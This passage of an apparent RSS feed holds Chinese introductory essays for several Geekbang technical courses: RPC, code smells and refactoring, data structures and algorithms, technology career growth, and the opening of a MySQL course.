&lt;p>分布式系统中的网络通信一般都会采用四层的 TCP 协议或七层的 HTTP 协议，在我的了解中，前者占大多数，这主要得益于 TCP 协议的稳定性和高效性。网络通信说起来简单，但实际上是一个非常复杂的过程，这个过程主要包括：对端节点的查找、网络连接的建立、传输数据的编码解码以及网络连接的管理等等，每一项都很复杂。&lt;/p>
&lt;p>你可以想象一下，在搭建一个复杂的分布式系统过程中，如果开发人员在编码时要对每个涉及到网络通信的逻辑都进行一系列的复杂编码，这将是件多么恐怖的事儿。所以说，网络通信是搭建分布式系统的一个大难题，是一点不为过的，我们必须给予足够的重视。&lt;/p>
&lt;p>而 RPC 对网络通信的整个过程做了完整包装，在搭建分布式系统时，它会使网络通信逻辑的开发变得更加简单，同时也会让网络通信变得更加安全可靠。&lt;/p>
&lt;p>现在你是不是感觉到学好 RPC 是很有必要的？&lt;/p>
&lt;h1 id="如何学习-rpc">如何学习 RPC？&lt;/h1>
&lt;p>那我们应该怎么去学习 RPC 呢？&lt;/p>
&lt;p>其实，深刻了解了为什么之后，怎么学这个问题并不难找到答案。就我自己的经验来看，我觉得可以用&amp;quot;&lt;strong>逐步深入&lt;/strong>&amp;ldquo;这四个字来概括我的学习方式。&lt;/p>
&lt;p>说起来也特别简单。当我们认识到，使用 RPC 就可以像调用本地一样发起远程调用，用它可以解决通信问题，这时候我们肯定要去学序列化、编解码以及网络传输这些内容。&lt;/p>
&lt;p>把这些内容掌握后，你就会发现，原来这些只是 RPC 的基础，RPC 还有更吸引人的点，它真正强大的地方是它的治理功能，比如连接管理、健康检测、负载均衡、优雅启停机、异常重试、业务分组以及熔断限流等等。突然间，你会感觉自己走进了一个新世界，这些内容会成为你今后学习 RPC 的重点和难点。&lt;/p>
&lt;p>这个逐步深入的过程，一定离不开真实的实践场景。学习知识，解决问题，遇到新问题，继续学习，不断解决问题，最后你会发现自己的学习曲线大概是这样的。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/74/8c/74539ca9da65ee0461ddb9299c277f8c.jpeg" alt="">&lt;/p>
&lt;p>总结一下，学习 RPC 时，我们先要了解其基本原理以及关键的网络通信部分，不要一味依赖现成的框架；之后我们再学习 RPC 的重点和难点，了解 RPC 框架中的治理功能以及集群管理功能等；这个时候你已经很厉害了，但这还不是终点，我们要对 RPC 活学活用，学会提升 RPC 的性能以及它在分布式环境下如何定位问题等等。&lt;/p>
&lt;h1 id="整个专栏能让你学到什么">整个专栏能让你学到什么？&lt;/h1>
&lt;p>上面提到的这些内容，就是我想通过这个专栏和你分享的。下面我来讲下本专栏的设计思路。&lt;/p>
&lt;p>我把整个专栏的内容分为了三大部分，分别是基础篇、进阶篇和高级篇。&lt;/p>
&lt;p>**基础篇：**重点讲解 RPC 的基础知识，包括 RPC 的基本原理以及它的基本功能模块，夯实基础之后，我们会以一场实战，通过剖析一款 RPC 框架来将知识点串联起来。&lt;/p>
&lt;p>**进阶篇：**重点讲解 RPC 框架的架构设计，以及 RPC 框架集群、治理相关的知识。这部分我会列举很多我在运营 RPC 框架中遇到的实际问题，以及这些问题的解决方案。&lt;/p>
&lt;p>**高级篇：**通过对上述两部分的学习，你已经对 RPC 有了较高层次的理解了。在这部分，我主要会从性能优化、线上问题排查以及一些比较有特色的功能设计上讲解 RPC 的应用。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/d1/bf/d15af80828fc3a9da2fea7a1aa232dbf.jpg" alt="">&lt;/p>
&lt;p>整个专栏跟下来，虽然主要讲解的都是 RPC 相关的知识，但你会接触到很多的案例和解决方案，它们首先会使你对 RPC 的理解到达一个较高的层次；其次就是这些知识和解决方案会有相通性，只要你能举一反三，对你今后的工作就会有很大的帮助。&lt;/p>
&lt;p>最后，我也很想听听你的想法。我们可以在留言区认识一下，期待你和我讲讲你的工作经历，你对 RPC 的认识，以及学习它的痛点、难点，我也好有针对性地为你讲解。现在，就让我们共同开启这段学习之旅吧！&lt;/p></description></item><item><title>极客专栏: 00丨开篇词丨这一次，我们从“丑”代码出发</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E8%BF%99%E4%B8%80%E6%AC%A1%E6%88%91%E4%BB%AC%E4%BB%8E%E4%B8%91%E4%BB%A3%E7%A0%81%E5%87%BA%E5%8F%91/</link><pubDate>Sat, 28 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E4%BB%A3%E7%A0%81%E4%B9%8B%E4%B8%91/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E8%BF%99%E4%B8%80%E6%AC%A1%E6%88%91%E4%BB%AC%E4%BB%8E%E4%B8%91%E4%BB%A3%E7%A0%81%E5%87%BA%E5%8F%91/</guid><description>
&lt;p>你好，我是郑晔！我又回来了！&lt;/p>
&lt;p>我在&amp;quot;极客时间&amp;quot;里已经写了两个专栏，分别是《10x 程序员工作法》和《软件设计之美》，从工作原则和设计原则两个方面对软件开发的各种知识进行了探讨，帮助你搭建了一个开启程序员精进之路的框架。&lt;/p>
&lt;p>不过，无论懂得多少道理，程序员依然要回归到写代码的本职工作上。所以，这次我准备和你从代码的坏味道出发，一起探讨如何写代码。&lt;/p>
&lt;h1 id="千里之堤毁于蚁穴">千里之堤毁于蚁穴&lt;/h1>
&lt;p>为什么要讲这个话题，就让我们先从一次代码评审讲起。在一次代码评审中，我注意到了这样一段代码：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void approve(final long bookId) {
...
book.setReviewStatus(ReviewStatus.APPROVED);
...
}
&lt;/code>&lt;/pre>&lt;p>这是在一个服务类里面写的，它的主要逻辑就是从仓库中找出一个作品，然后，将它的状态设置为审核通过，再将它存回去。前后的代码都属于常规的代码，但是，设置作品评审状态的代码引起了我的注意，于是有了下面这段对话。&lt;/p>
&lt;blockquote>
&lt;p>我：这个地方为什么要这么写？
同事：我要将作品的审核状态设置为审核通过。
我：这个我知道，但为什么要在这里写 setter 呢？
同事：你的意思是？
我：这个审核的状态是作品的一个内部状态，为什么服务需要知道它呢？也就是说，这里通过 setter，将一个类的内部行为暴露了出来，这是一种破坏封装的做法。&lt;/p>
&lt;/blockquote>
&lt;p>同事被我说动了，于是这段代码变成了下面这个样子：&lt;/p>
&lt;pre tabindex="0">&lt;code>public void approve(final long bookId) {
...
book.approve();
...
}
&lt;/code>&lt;/pre>&lt;p>之所以我注意到这段代码，完全是因为这里用到了 setter。在我看来，setter 就是一个坏味道，每次一看到 setter，我就会警觉起来。&lt;/p>
&lt;p>setter 的出现，是对于封装的破坏，它把一个类内部的实现细节暴露了出来。我在《软件设计之美》中讲过，面向对象的封装，关键点是行为，而使用 setter 多半只是做了数据的聚合，缺少了行为的设计，这段代码改写后的 approve 函数，就是这里缺少的行为。&lt;/p>
&lt;p>再扩展一步，setter 通常还意味着变化，而我在《软件设计之美》中讲函数式编程时也说过，一个好的设计应该尽可能追求不变性。所以，setter 也是一个提示符，告诉我们，这个地方的设计可能有问题。&lt;/p>
&lt;p>你看，一个小小的 setter，背后却隐藏着这么多的问题。而所有这些问题，都会让代码在未来的日子变得更加不可维护，这就是软件团队陷入泥潭的开始。&lt;/p>
&lt;p>我也一直和我团队的同学说，&amp;ldquo;写代码&amp;quot;有两个维度：正确性和可维护性，不要只关注正确性。能把代码写对，是每个程序员的必备技能，&lt;strong>但能够把代码写得更具可维护性，这是一个程序员从业余迈向职业的第一步&lt;/strong>。&lt;/p>
&lt;h1 id="将坏味道重构为整洁代码">将坏味道重构为整洁代码&lt;/h1>
&lt;p>或许你也认同代码要有可维护性，也看了很多书，比如《程序设计实践》《代码整洁之道》等等，这些无一不是经典中的经典，甚至连怎么改代码，都有《重构》等着我们。没错，这些书我都读过，也觉得从中受益匪浅。&lt;/p>
&lt;p>不过，回到真实的工作中，我发现了一个无情的事实：&lt;strong>程序员们大多会认同这些书上的观点，但每个人对于这些观点的理解却是千差万别的。&lt;/strong>&lt;/p>
&lt;p>比如书上说：&amp;ldquo;命名是要有意义的&amp;rdquo;，但什么样的命名才算是有意义的呢？有的人只理解到不用 xyz 命名，虽然他起出了自认为&amp;quot;有意义&amp;quot;的名字，但这些名字依然是难以理解的。事实上，大部分程序员在真实世界中面对的代码，就是这样难懂的代码。&lt;/p>
&lt;p>这是因为，&lt;strong>很多人虽然知道正面的代码是什么样子，却不知道反面的代码是什么样子&lt;/strong>。这些反面代码，Martin Fowler 在《重构》这本书中给起了一个好名字，代码的坏味道（Bad Smell）。&lt;/p>
&lt;p>在我写代码的这 20 多年里，一直对代码的坏味道非常看重，因为它是写出好代码的起点。有对代码坏味道的嗅觉，能够识别出坏味道，接下来，你才有机会去&amp;quot;重构（Refactoring）&amp;quot;，把代码一点点打磨成一个整洁的代码（Clean Code）。Linux 内核开发者 Linus Torvalds 在行业里有个爱骂人的坏名声，原因之一就是他对于坏味道的不容忍。&lt;/p>
&lt;p>所以，我也推荐那些想要提高自己编程水平的人读《重构》，如果时间比较少，就去读第三章&amp;quot;代码的坏味道&amp;rdquo;。&lt;/p>
&lt;p>不过，《重构》中的&amp;quot;代码的坏味道&amp;quot;意图虽好，但却需要一个人对于整洁代码有着深厚的理解，才能识别出这些坏味道。否则，即使你知道有哪些坏味道，但真正有坏味道的代码出现在你面前时，你仍然无法认得它。&lt;/p>
&lt;p>比如，你可以看看 Info、Data、Manager 是不是代码库经常使用的词汇，而它们往往是命名没有经过仔细思考的地方。在很多人眼中，这些代码是没有问题的。正因如此，才有很多坏味道的代码才堂而皇之地留在你的眼皮底下。&lt;/p>
&lt;p>所以，我才想做一个讲坏味道的专栏，把最常见的坏味道直接用代码形式展现出来。在这个专栏里，我给你的都是即学即用的&amp;quot;坏味道&amp;quot;，我不仅会告诉你典型的坏味道是什么，而且也能让你在实际的编程过程中发现它们。比如前面那个例子里面的 setter，只要它一出现，你就需要立即警觉起来。&lt;/p>
&lt;p>这里我也整理了一份&amp;quot;坏味道自查表&amp;quot;，把一些明显的&amp;quot;坏味道&amp;quot;信号列了出来，你可以和自己的代码做对比。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/2e/f1/2e543283f04aa3706d60a7b1e0f257f1.jpg" alt="">&lt;/p>
&lt;p>除了为你列出来哪些代码有坏味道之外，我还会给你讲支撑这些&amp;quot;坏味道&amp;quot;之所以为&amp;quot;坏味道&amp;quot;的原因，比如说：长方法和大类之所以为坏味道，因为它们都违背了单一职责的原则。&lt;/p>
&lt;p>有坏味道的代码需要经过重构才能长成新的样子，在这个专栏里，我也会提到一些重构的手法，比如，改名（Rename）、提取方法（Extract Method）等等。在今天，拜许多能力强大的 IDE 所赐，重构已经变得越来越自动化，《重构》里的很多手法已经成为了 IDE 中的一个选项。&lt;/p>
&lt;p>我还想给你一个安全提示，即便 IDE 功能再强大，也不要忘了重构的重要根基：测试。即便像 Java 这样，IDE 功能已经非常强大了，依然会有一些像反射之类的场景可能会从自动化重构的鼻子底下溜走。所以，重构一段代码之前，最好能够给它写下测试，确保改动前后的代码，功能上是一致的。&lt;/p>
&lt;p>如果你订阅过我的《10x 程序员工作法》和《软件设计之美》，你就会发现，三个专栏一脉相承，这些背后的道理恰恰就是我在那两个专栏中已经提到过的内容。所以，三个专栏一并服用，效果会更佳。&lt;/p>
&lt;h1 id="写在最后">写在最后&lt;/h1>
&lt;p>最后，还是要做一个自我介绍。我叫郑晔，一个写代码超过二十年的程序员，做过与软件开发的各种工作：编代码、带团队、做咨询、写开源。正如前面所说，我已经在极客时间平台上写了两个专栏，分享我在软件开发中的各种思考。这次，我会带你进入到我的基本功里，帮你一起写好代码。&lt;/p>
&lt;p>十年前，我在 InfoQ 写过一个专栏《代码之丑》，把一些真实世界的代码展示了出来，让大家看到丑陋代码是什么样子的。&lt;/p>
&lt;p>不少读者都表示，那个专栏让他们受益匪浅。不过，那个系列只是我日常工作的随手之作，没有更好地整理。这个专栏就是脱胎于 InfoQ 上的《代码之丑》，我对相关内容进行了更系统地整理，保证即便看过那个《代码之丑》专栏，你依然能够在这里有所收获。&lt;/p>
&lt;p>这是一条通往代码精进之路，我愿意与你一起前行，成为你在这条路上的向导。如果你想摆脱平庸的小白程序员状态，成为一个更优秀的程序员，那么，请加入我的专栏，让我们一起修炼，日益精进写代码的手艺！&lt;/p></description></item><item><title>极客专栏: 00丨开篇词丨从今天起，跨过“数据结构与算法”这道坎</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E4%BB%8E%E4%BB%8A%E5%A4%A9%E8%B5%B7%E8%B7%A8%E8%BF%87%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E8%BF%99%E9%81%93%E5%9D%8E/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E4%BB%8E%E4%BB%8A%E5%A4%A9%E8%B5%B7%E8%B7%A8%E8%BF%87%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E8%BF%99%E9%81%93%E5%9D%8E/</guid><description>
&lt;p>你好，我是王争，毕业于西安交通大学计算机专业。现在回想起来，本科毕业的时候，我的编程水平其实是很差的。直到读研究生的时候，一个师兄给了我一本《算法导论》，说你可以看看，对你的编程会很有帮助。&lt;/p>
&lt;p>没想到，从此我对算法的&amp;quot;迷恋&amp;quot;便一发不可收拾。之后，我如饥似渴地把图书馆里几乎所有数据结构和算法书籍都读了一遍。&lt;/p>
&lt;p>我常常边读边练。没多久，我就发现，写代码的时候，我会不由自主考虑很多性能方面的问题。我写出时间复杂度高、空间复杂度高的垃圾代码越来越少了，算法能力提升了很多，编程能力也有了质的飞跃。得益于此，研究生毕业后，我直接进入 Google，从事 Google 翻译相关的开发工作。&lt;/p>
&lt;p>这是我自己学习数据结构与算法的经历，现在，你可以想想你的情况。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>是不是从学校开始，你就觉得数据结构难学，然后一直没认真学？&lt;/p>
&lt;/li>
&lt;li>
&lt;p>工作中，一遇到数据结构这个坑，你又发自本能地迅速避让，因为你觉得自己不懂，所以也不想深究，反正看起来无关大局？&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当你想换工作面试，或者研究某个开源项目源码，亦或者和团队讨论某个非框架层面的高可用难题的时候，你又发现，自己的基础跟不上别人的节奏？&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>如果你是这种情况，其实你并不孤独，这不是你一个人遇到的问题。工作十年间，我见过许多程序员。他们有着各种各样的背景，有很多既有潜力又非常努力，但始终无法在自己现有水平上更进一步。&lt;/p>
&lt;p>在技术圈里，我们经常喜欢谈论高大上的架构，比如高可用、微服务、服务治理等等。鲜有人关注代码层面的编程能力，而愿意沉下心来，花几个月时间啃一啃计算机基础知识、认认真真夯实基础的人，简直就是凤毛麟角。&lt;/p>
&lt;p>我认识一位原来腾讯 T4 的技术大牛。在区块链大潮之前，他在腾讯工作了 10 多年，长期负责手机 QQ 后台整体建设。他经历了手机 QQ 从诞生到亿级用户在线的整个过程。后来他去了微众银行，有一天老板让他去做区块链。&lt;strong>他用了不到半年时间，就把区块链的整个技术脉络摸清楚了。&lt;/strong> 现在，他是微众银行的区块链负责人，微众科技创新产品部的老总。你说厉害不？你可以花半年时间就能精通一个新的领域吗？为什么他就可以做到？&lt;/p>
&lt;p>我觉得这其中最重要的就是基础足够扎实。他曾经跟我说，像区块链、人工智能这些看似很新的技术，其实一点儿都不&amp;quot;新&amp;quot;。最初学编程的时候，他就把那些基础的知识都学透了。当面临行业变动、新技术更迭的时候，他不断发现，那些所谓的新技术，核心和本质的东西其实就是当初学的那些知识。掌握了这个&amp;quot;规律&amp;quot;之后，他学任何东西都很快，任何新技术都能快速迎头赶上。这就是他快速学习并且获得成功的秘诀。&lt;/p>
&lt;p>所以说，&lt;strong>基础知识就像是一座大楼的地基，它决定了我们的技术高度。而要想快速做出点事情，前提条件一定是基础能力过硬，&amp;ldquo;内功&amp;quot;要到位&lt;/strong>。&lt;/p>
&lt;p>那技术人究竟都需要修炼哪些&amp;quot;内功&amp;quot;呢？我觉得，无外乎就是大学里的那些基础课程，操作系统、计算机网络、编译原理等等，当然还有数据结构和算法。&lt;/p>
&lt;p>可是，我们都知道，像《算法导论》这些经典书籍，虽然很全面，但是过于理论，学起来非常枯燥；而市面很多课程大多缺失真实的开发场景，费劲学完感觉好像还是用不上，过不了几天就忘了。&lt;/p>
&lt;p>所以，我尝试做一个让你能真正受用的数据结构与算法课程，希望给你指明一个简洁、高效的学习路径，教你一个学习基础知识的通用方法 。那么，关于专栏内容，我是怎样设计的呢？&lt;/p>
&lt;ol>
&lt;li>
&lt;p>我根据自己研读数十本算法书籍和多年项目开发的经验，在众多的数据结构和算法中，精选了最实用的内容进行讲解。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>我不只会教你怎么用，还会告诉你，我们为什么需要这种数据结构和算法，一点点帮你捋清它们背后的设计思想，培养你举一反三的能力。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>对于每种数据结构和算法，我都会结合真实的软件开发案例来讲解，让你知道，数据结构和算法，究竟应该如何应用到实际的编码中。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>为了&lt;strong>由浅入深&lt;/strong> 地带你学习，我把专栏分成四个&lt;strong>递进&lt;/strong>的模块。&lt;/p>
&lt;ol>
&lt;li>&lt;strong>入门篇&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>时间、空间复杂度分析是数据结构和算法中非常重要的知识点，贯穿整个专栏的学习过程。但同时也是比较难掌握的，所以我用了 2 节课来讲这部分内容，而且还举了大量的实例，让你一边学一边练，真正能掌握复杂度分析，为后面的学习铺路。&lt;/p>
&lt;p>我希望通过这一模块，你能掌握时间、空间复杂度的概念，大 O 表示法的由来，各种复杂度分析技巧，以及最好、最坏、平均、均摊复杂度分析方法。之后，面对任何代码的复杂度分析，你都能游刃有余、毫不畏惧！&lt;/p>
&lt;ol start="2">
&lt;li>&lt;strong>基础篇&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>这部分是专栏中篇幅最大的内容，也是我们学习的重点，共有 26 节内容，涵盖了最基础、最常用的数据结构和算法。针对每种数据结构和算法，我都会结合具体的软件开发实例，由浅入深进行讲解，并适时总结一些实用&amp;quot;宝典&amp;rdquo;，保证你印象深刻、学有所用。&lt;/p>
&lt;p>比如递归这一节，我会讲到，为什么递归代码比较难写？如何避免堆栈溢出？如何避免递归冗余计算？如何将递归代码转化为非递归代码？&lt;/p>
&lt;ol start="3">
&lt;li>&lt;strong>高级篇&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>这部分我会讲一些不是那么常用的数据结构和算法。虽然不常用，但是这些内容你也需要知道。设置这一部分的目的，是为了让你开拓视野，强化训练算法思维、逻辑思维。如果说学完基础部分可以考 80 分，那掌握这一部分就能让你成为尖子生！&lt;/p>
&lt;ol start="4">
&lt;li>&lt;strong>实战篇&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>我们整个专栏都是围绕数据结构和算法在具体软件实践中的应用来讲的，所以最后我会通过实战部分串讲一下前面讲到的数据结构和算法。我会拿一些开源项目、框架或者系统设计问题，剖析它们背后的数据结构和算法，让你有一个更加直观的感受。&lt;/p>
&lt;p>人生路上，我们会遇到很多的坎。跨过去，你就可以成长，跨不过去就是困难和停滞。而在后面很长的一段时间里，你都需要为这个困难买单。对于我们技术人来说，更是这样。&lt;strong>既然数据结构和算法这个坎，我们总归是要跨过去，为什么不是现在呢？&lt;/strong>&lt;/p>
&lt;p>我很感激师兄当年给我的那本《算法导论》，这是我人生中为数不多的转折点之一。没有那本书，也可能就没有今天的我。我希望这个专栏也能成为你的一个人生转折点。&lt;/p>
&lt;p>我希望，通过这个专栏，不仅能帮你跨过数据结构与算法这个坎，还能帮你掌握一种学习知识和技能的方法，帮你度过职场甚至人生的重要时刻！一起加油吧！&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/8e/d3/8e603e3d795fc0ab2698f6f5eabf14d3.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 00丨开篇词丨洞悉技术的本质，享受科技的乐趣</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E6%B4%9E%E6%82%89%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%AC%E8%B4%A8%E4%BA%AB%E5%8F%97%E7%A7%91%E6%8A%80%E7%9A%84%E4%B9%90%E8%B6%A3/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E5%B7%A6%E8%80%B3%E5%90%AC%E9%A3%8E/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E6%B4%9E%E6%82%89%E6%8A%80%E6%9C%AF%E7%9A%84%E6%9C%AC%E8%B4%A8%E4%BA%AB%E5%8F%97%E7%A7%91%E6%8A%80%E7%9A%84%E4%B9%90%E8%B6%A3/</guid><description>
&lt;p>你好，我是陈皓，网名左耳朵耗子。我目前在创业，MegaEase 是我的公司，致力于为企业提供高可用、高并发、高性能的分布式技术产品，同时也提供物联网（IoT）方向的技术产品。&lt;/p>
&lt;p>我之前在阿里巴巴、亚马逊、汤森路透等公司任职，职业背景是金融和电子商务行业，主要研究的技术方向是一些大规模分布式系统的基础架构。&lt;/p>
&lt;p>从大学毕业一直做技术工作，到今天有 20 年了，还在写代码，因为我对技术有很大的热情。我从 2002 年开始写技术博客，到 2009 年左右开始在独立的域名 &lt;a href="http://CoolShell.cn">CoolShell.cn&lt;/a>（酷壳）上分享我对技术的一些见解和心得。&lt;/p>
&lt;p>本来只想记录一下，没想到得到了很多人的认可，这对我来说是一个不小的鼓励。我的文章和分享始终坚持观点鲜明的特点，因为我希望可以引发大家的讨论和批评，这样分享才更有意义。&lt;/p>
&lt;p>无论我的观点是否偏激、不成熟，或者言辞犀利，在经历过大家的批评和讨论后，我都能够从中得到不在我视角内的思考和认知，这对我来说是非常重要的补充，对我的个人成长非常重要。&lt;/p>
&lt;p>我相信，看到这些文章和讨论的人，也能从中收获到更多的东西。&lt;/p>
&lt;p>坦率地讲，刚收到专栏撰写邀请的时候，我心里面是拒绝的。正如前面所说的，我分享的目的是跟大家交流和讨论，我认为，全年付费专栏这样的方式可能并不好。而且，付费专栏还有文章更新频率的 KPI，这对于像我这样一定要有想法才会写文章的人来说是很痛苦的，因为我不想为了写而写。&lt;/p>
&lt;p>所以，最初，我是非常不情愿的。&lt;/p>
&lt;p>极客邦科技的编辑跟我沟通过很多次，也问过我是否在做一些收费的咨询或是培训，并表明这个专栏就是面对这样的场景的。我想想也是。我其实从 2003 年就开始为很多企业做内部的培训和分享了。&lt;/p>
&lt;p>这些培训涵盖了很多方面，如软件团队管理、架构技术、编程语言、操作系统等，以及一些为企业量身定制的咨询或软件开发，这些都是收费的。&lt;/p>
&lt;p>而我一直以来也没有把这些内容分享在我的博客里，主要原因是我觉得这些内容是有商业价值的，是适合收费的。它们都是实实在在的，是我多年来对实战经验的深入总结和思考，非常来之不易。&lt;/p>
&lt;p>我不太舍得拿出来大范围地分享，以前基本上仅小范围地在企业内部比较封闭的环境里讲讲。所以说，我这边其实是有两种分享，一种是企业内的分享，一种则是像 CoolShell 或是大会这样的公开分享。&lt;/p>
&lt;p>前者更企业化一些，后者更通俗化一些。&lt;/p>
&lt;p>在这个付费专栏中，除了继续保持观点鲜明的行文风格，我会分享一些与个人或企业切身利益更为相关的内容，或者说更具指导性、更有商业价值的东西。而 CoolShell，我还会保持现有的风格继续写下去。&lt;/p>
&lt;p>正如这个专栏的 Slogan 所说：&amp;ldquo;洞悉技术的本质，享受科技的乐趣&amp;rdquo;，我会在这个专栏里分享包括但不限于如下这些内容。&lt;/p>
&lt;h1 id="技术">技术&lt;/h1>
&lt;p>对于技术方面，我不会写太多关于知识点的东西，因为这些知识点你可以自行 Google 可以 RTFM。我要写的一定是以体系化的，而且要能直达技术的本质。入行这 20 年来，我最擅长的就是架构和开发各种大规模的系统，所以，我会有 2-3 个和分布式系统相关的系列文章。&lt;/p>
&lt;p>我学过也用过好多编程语言，所以，也会有一系列的关于编程本质的文章。而我对一些基础知识研究得也比较多，所以，还会有一系列与基础知识相关的文章。&lt;/p>
&lt;p>当然，其中还会穿插一些其它的技术文章，比如一些热点事件，还有一些经验之谈，包括我会把我的《程序员技术练级攻略》在这个专栏里重新再写一遍。这些东西一定会让你有醍醐灌顶的感觉。&lt;/p>
&lt;h1 id="成长">成长&lt;/h1>
&lt;p>在过去这 20 年中，我感觉到，很多人都非常在意自己的成长。所以，我会分享一堆我亲身经历的，也是我自己实验的与个人发展相关的文章。&lt;/p>
&lt;p>比如，如何利用技术变现、如何面试、如何选择新的技术、如何学习、如何管理自己的时间、如何管理自己的老板和工作、如何成为一个 Leader&amp;hellip;&amp;hellip;这些东西一定会对你有用。（但是，我这里一定不会有速成的东西。一切都是要花时间和精力的。如果你想要速成，你不应该来订阅我的专栏。）&lt;/p>
&lt;h1 id="管理">管理&lt;/h1>
&lt;p>这 20 年，我觉得做好技术工作的前提是，得做好技术的管理工作。只有管理好了软件工程和技术团队，技术才能发挥出最大的潜力。大多数的技术问题都是管理上的问题。&lt;/p>
&lt;p>所以，我会写上一系列的和管理相关的文章，涵盖管理三个要素：团队、项目和管理者自己。比如，人员招聘、绩效考核、提升士气、解决冲突、面对变化、沟通说服、项目管理、任务排期、会议、远程管理，等等。&lt;/p>
&lt;p>这些内容都是我在外企工作时，接受到的世界顶级管理培训机构培训内容，我会把我的实践写出来分享给你。这其中一定少不了亚马逊相关的各种实践。这些东西，我和很多公司和大佬都讲过，到目前为止还没有人不赞的。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/7f/7b/7f428c8dd8f26668a727bd46227ec17b.jpg" alt="">&lt;/p>
&lt;p>为了对付费用户负责，保证文章能够达到收费的质量，我承诺这个专栏的每一篇文章一定是用心创作的，而且是可以让你从中受益的。&lt;/p>
&lt;p>但因为是第一次做全年专栏，收费也让我有一定的压力，所以，我非常希望你能够跟我分享你的感受和体会。&lt;/p>
&lt;p>我会根据你的反馈及时做出调整和修正，并不断努力提高文章的质量和思想高度，以满足你对有价值、有营养的文章的需求。&lt;/p></description></item><item><title>极客专栏: 00丨开篇词丨这一次，让我们一起来搞懂MySQL</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E8%BF%99%E4%B8%80%E6%AC%A1%E8%AE%A9%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%9E%E6%87%82mysql/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/00%E4%B8%A8%E5%BC%80%E7%AF%87%E8%AF%8D%E4%B8%A8%E8%BF%99%E4%B8%80%E6%AC%A1%E8%AE%A9%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%9E%E6%87%82mysql/</guid><description>
&lt;p>你好，我是林晓斌，网名&amp;quot;丁奇&amp;quot;，欢迎加入我的专栏，和我一起开始 MySQL 学习之旅。我曾先后在百度和阿里任职，从事 MySQL 数据库方面的工作，一步步地从一个数据库小白成为 MySQL 内核开发人员。回想起来，从我第一次带着疑问翻 MySQL 的源码查到答案至今，已经有十个年头了。在这个过程中，走了不少弯路，但同时也收获了很多的知识和思考，希望能在这个专栏里分享给你。&lt;/p>
&lt;p>记得刚开始接触 MySQL，是我在百度贴吧做权限系统的时候。我们遇到了一个奇怪的问题，一个正常 10 毫秒就能完成的 SQL 查询请求偶尔要执行 100 多毫秒才结束。当时主管问我是什么原因，我其实也搞不清楚，就上网查答案，但怎么找都找不到，又脸皮薄不想说自己不知道，只好硬着头皮翻源码。后来遇到了越来越多的问题，也是类似的情景，所以我逐步养成了通过分析源码理解原理的习惯。&lt;/p>
&lt;p>当时，我自己的感觉是，即使我只是一个开发工程师，只是 MySQL 的用户，在了解了一个个系统模块的原理后，再来使用它，感觉是完全不一样的。当在代码里写下一行数据库命令的时候，我就能想到它在数据库端将怎么执行，它的性能是怎么样的，怎样写能让我的应用程序访问数据库的性能最高。进一步，哪些数据处理让数据库系统来做性能会更好，哪些数据处理在缓存里做性能会更好，我心里也会更清楚。在建表和建索引的时候，我也会更有意识地为将来的查询优化做综合考虑，比如确定是否使用递增主键、主键的列怎样选择，等等。&lt;/p>
